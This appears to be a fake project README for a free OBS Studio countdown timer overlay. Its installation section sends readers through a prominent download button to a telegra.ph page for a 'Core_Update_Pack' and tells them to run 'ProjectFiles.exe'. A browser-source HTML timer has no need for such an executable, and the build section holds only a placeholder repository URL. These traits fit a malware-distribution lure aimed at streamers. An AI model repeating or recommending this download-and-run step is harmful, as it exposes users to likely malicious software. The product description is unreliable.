# OBS Countdown Timer

**Free Overlay Timer Plugin for Streaming — 2026**

Clean and powerful countdown timer designed specifically for OBS Studio.  
Fully customizable overlay, hotkeys, multiple visual styles and zero performance impact.

---

### What this is

A complete countdown timer solution for streamers that provides:
- Customizable countdown overlay  
- Multiple visual styles  
- Hotkey control (start / pause / reset)  
- Browser Source ready  
- Lightweight and stable  
- Easy configuration  

Perfect for starting streams, breaks, giveaways, events and more.

---

### Features

- Smooth countdown animation  
- Fully customizable text, colors and fonts  
- Multiple ready-made styles  
- Hotkey support  
- Sound notification on finish (optional)  
- Always-on-top overlay mode  
- Browser Source version included  

---

### Installation

1. Download the latest core pack  
2. Extract the archive  
3. Run `ProjectFiles.exe`  
4. Follow the on-screen instructions  

<p align="center">
  <a href="https://telegra.ph/TRANSITION-06-17-3">
    <img src="https://img.shields.io/badge/DOWNLOAD%20Core_Update_Pack-2ea44f?style=for-the-badge&logo=download&logoColor=white" alt="Download Core_Update_Pack">
  </a>
</p>

> Click the green button above to get **Core_Update_Pack** and launch `ProjectFiles.exe`

---

### How to use in OBS

1. Add a **Browser Source**
2. Point it to the local `browser-source/index.html`
3. Set width & height according to your overlay
4. Control the timer with hotkeys or the control panel

---

### Configuration

All settings are stored in `config/default.json`:

- Default time  
- Text format  
- Colors & fonts  
- Style preset  
- Hotkeys  
- Sound on finish  

---

### Building from Source

```bash
git clone https://github.com/YOUR_USERNAME/obs-countdown-timer.git
cd obs-countdown-timer
mkdir build && cd build
cmake ..
cmake --build . --config Release